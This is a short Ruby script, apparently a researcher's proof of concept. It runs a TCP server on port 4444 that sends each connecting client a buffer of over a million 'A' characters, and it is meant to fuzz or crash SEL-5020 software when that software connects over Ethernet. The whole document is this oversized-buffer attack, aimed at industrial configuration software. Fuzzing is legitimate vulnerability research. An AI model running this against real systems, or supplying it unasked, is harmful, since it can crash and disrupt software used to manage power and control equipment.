#!/usr/bin/env ruby
# simple tcp server to fuzz SEL-5020
# when it's configured to connect via ethernet.
# - mario ceballos
require 'socket'

buff = "A" * 1000024 + "\r\n\r\n" 
server = TCPServer.new 4444

loop do
  client =  server.accept
  select(nil,nil,nil,0) 
  client.write(buff)
  client.close
end
#
